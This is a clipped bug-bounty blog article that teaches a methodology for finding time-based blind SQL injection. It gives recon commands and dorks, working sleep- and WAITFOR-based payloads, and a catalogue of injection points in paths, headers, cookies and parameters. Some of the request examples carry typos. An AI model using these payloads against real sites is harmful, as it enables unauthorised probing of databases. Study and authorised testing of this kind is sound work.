---
title: "Time Based SQL Injection Bug Hunting Methodology💉 | by AbhirupKonwar - Freedium"
source: "https://freedium.cfd/https://osintteam.blog/time-based-sql-injection-bug-hunting-methodology-be485de5ab9e"
author:
published:
created: 2025-01-21
description: "Free Article Link: Click here"
tags:
  - "clippings"
---
Welcome hackers, I am Abhirup Konwar (aka [LegionHunter](https://www.youtube.com/@LegionHunter)). I work as a full time bug hunter and part-time malware developer with the goal of becoming an elite red teamer. I have reported over 1000 bugs on [OpenBugBounty](https://www.openbugbounty.org/researchers/cybersec_6060/) , as well as on HackerOne and BugCrowd with bugs belonging to both Client and Server Injection category, Sensitive Information Disclosure & Broken Access Control. I mainly focus on recon based hunting where other hunters simply fail to touch that obscure endpoint.

In this article, I am going to elaborate what are the practical and manual steps an experienced bug hunter takes to uncover Time Based SQL Injection Vulnerability , meanwhile the beginners will only keep injecting single quote and double quote on all GET request parameters in a hope to see the keyword "error" in the server response , as this is the only well-known test case they might know about when they first start , run sqlmap with default configuration and later complain bug hunting is a waste where they claim there are putting efforts daily from 1 year which itself signifies that he/she doesn't try new approaches, building own methodology, daily self hit and trial new experiments and simply copy pasting someone else pentesting checklists without any understanding the difference between pentesting or VAPT engagements and crowd-sourced bug hunting, but no worries :) we are here to learn now!😎

Overall there are 3 main types of SQL Injection: *In-band, Blind & Out-of-band*

In-band is well known and tested by all , blind is explored by the experienced, and Out-of-band is top hunter's secret ingredient.🤫

Time-based SQL injection comes under Blind SQL Injection where we are mainly focused on injecting single or multiple payloads on all injection points and check the server response time in a proxy like BurpSuite.

![None](https://miro.medium.com/v2/resize:fit:700/1*wEfUahta9DkFVa06W5yxCQ.png)

Burpsuite Repeater Tab: Response time from the server

#### We need to find out the database used by the web app.

For this I use wappalyzer chrome extension when I manually visit the subdomains.

![None](https://miro.medium.com/v2/resize:fit:700/1*Q-mwjJBDlH_6oSz2bHM84w.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*vZjt0GhQ2z0-JncSX_oISA.png)

You are lucky if you find it is running on PHP + MySQL 🤑. Must try SQLi

Alternatively,

```bash
subfinder -d domain.com -all -recursive > subs_domain.com.txt
cat subs_domain.com.txt | httpx -td -title -sc -ip > httpx_domain.com.txt
cat httpx_domain.com.txt | awk '{print $1}' > live_subs_domain.com.txt
cat live_subs_domain.com.txt | grep -i php
cat live_subs_domain.com.txt | grep -i asp  
```

![None](https://miro.medium.com/v2/resize:fit:700/1*nyaTWaxdUwhbXpUIKEXMYw.png)

Or directly hit the endpoint like a [Pro Dork Hunter](https://www.youtube.com/playlist?list=PLqOQy6wxttBju5pKnatxQRY3fTejOkgZ9)

```makefile
site:domain.com ext:php
site:domain.com ext:asp
site:domain.com ext:aspx
```

Now we need to find subdomains / endpoints where it is running on old technology like PHP , ASP, ASPX, which increases the probability that it is associated with traditional DBMS.

Below are the list of payloads specifically for time based sqli testing which are valid and reported on HackerOne using this.

```
0'XOR(if(now()=sysdate()%2Csleep(20)%2C0))XOR'Z

0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z

if(now()=sysdate(),sleep(20),0)/*'XOR(if(now()=sysdate(),sleep(20),0))OR'"XOR(if(now()=sysdate(),sleep(20),0))OR"*/

1234 AND SLEEP(20)

';WAITFOR DELAY '00:00:05';--
```

If the parameter value is a number

```
paramname=1'-IF(1=1,SLEEP(20),0) AND paramname='1
```

### INJECTION POINTS 😈

Now where do we inject guys?

💉 = insert the payload here

#### URI Paths

```bash
GET /path1/path2/path3/path4 HTTP/2
POST /path1/path2/path3/path4 HTTP/2
GET /path1💉/path2💉/path3💉/path4💉 HTTP/2

GET /💉path1/💉path2/💉path3/💉path4 HTTP/2

POST /path1💉/path2💉/path3💉/path4💉 HTTP/2

POST /💉path1/💉path2/💉path3/💉path4 HTTP/2
```

#### User-Agent Header

```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0💉

User-Agent: 💉

User-Agent: 💉Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
```

#### Referer Header

```bash
Referer: https://www.google.com/
Referer: https://www.google.com/💉
Referer: 💉https://www.google.com/
Referer: 💉
```

#### Cookie parameter values + values

```
Cookie: param1name=param1value; param2name=param2value
Cookie: param1name=param1value💉; param2name=param2value💉

Cookie: param1name=💉param1value; param2name=💉param2value

Cookie: param1name💉=param1value; param2name💉=param2value

Cookie: 💉param1name=param1value; 💉param2name=param2value
```

#### GET based parameter names + values

```bash
GET /path1/path2/anyname.php?param1name=param1value&param2name=param2value
GET /path1/path2/anyname.php?param1name=param1value&param2name=param2value💉
GET /path1/path2/anyname.php?param1name=param1value&param2name=💉param2value
GET /path1/path2/anyname.php?param1name=param1value&param2name💉=param2value
GET /path1/path2/anyname.php?param1name=param1value&💉param2name=param2value
GET /path1/path2/anyname.php?param1name=param1value💉R&am;param2name=param2value
GET /path1/path2/anyname.php?param1name=💉Rparm1value&param2name=param2value
GET /path1/path2/anyname.php?param1name💉R=paam1value&param2name=param2value
GET /path1/path2/anyname.php?💉Rparm1name=param1value&param2name=param2value
```

#### POST based parameter names + values

```makefile
POST /login HTTP/2
Host: redacted.com
Cookie: .............
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: ...
Dnt: 1
Sec-Gpc: 1
Referer: https://www.google.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=admin@admin.com&password=pass1234
email=admin@admin.com&password=pass1234💉
email=admin@admin.com&password=💉pass1234
email=admin@admin.com&password💉=pass1234
email=admin@admin.com&💉password=pass1234
email=admin@admin.com💉R&am;password=pass1234
email=💉Radmn@admin.com&password=pass1234
email💉R=adin@admin.com&password=pass1234
💉Remal=admin@admin.com&password=pass1234
```

Black box testing, you never know how the server might behave.😜

If you get the expected delay response time to be 20 seconds or more than 20 seconds, increase and decrease the number and verify with 5–6 test cases. You can report at this point of time to the company or the crowd-sourced platform program target, run sqlmap or ghauri automated tool only when it is asked by the triager.

```
0'XOR(if(now()=sysdate()%2Csleep(20)%2C0))XOR'Z - got delay of 20 second or more?
0'XOR(if(now()=sysdate()%2Csleep(30)%2C0))XOR'Z - got delay of 30 second or more?
0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z ....
0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z ... 
0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z ...
```

### Daily Bug Report Reading Habit

You can refer valid publicly disclosed bug reports by using below dork

```
site:hackerone.com inurl:reports "time based"
site:hackerone.com inurl:reports "time based SQL Injection"
site:hackerone.com inurl:reports "SQL Injection"
site:hackerone.com inurl:reports "XOR"
```

![None](https://miro.medium.com/v2/resize:fit:700/1*txGkNiQSsiyv3uIEDQUwwg.png)

I suggest to solve [portswigger sql injection labs](https://portswigger.net/web-security/all-labs) to gain more insights into it before diving straight into real world targets.

For comprehensive payloads based on the DBMS used, refer below👇

🤔*Note: In modern apps , you will often find NOSQL databases like mongodb, and the traditional SQL Injection methods don't work and approach is different in this case.Need to learn NO-SQL Injection for this.*

#### 🔗Other Articles you might like:

[Live Bug Hunting Recon Methodology](https://systemweakness.com/bug-hunting-recon-methodology-part1-legionhunter-975b7bbe3231)

[How I found bug in a billion dollar healthcare company](https://medium.com/the-first-digit/p4-bug-in-healthcare-company-979db17df4dd)

📱Follow me on [X](https://x.com/KonwarAbhi98099) and [LinkedIn](https://www.linkedin.com/in/abhirup-konwar-a626201a6/) for daily bug hunting updated tips.

*Ok hackers, time to leave for today! Happy Hunting :)*

![None](https://miro.medium.com/v2/resize:fit:700/1*UP3JrAtCXq5Q5JarsHv-4Q.png)

Credit: DALL-E 3

### ☕ Enjoyed this article?

If you find any bugs using my articles and videos and found it to be helpful to you, I would greatly appreciate your support! Your contributions enable me to continue sharing detailed knowledge and improving my work in cybersecurity.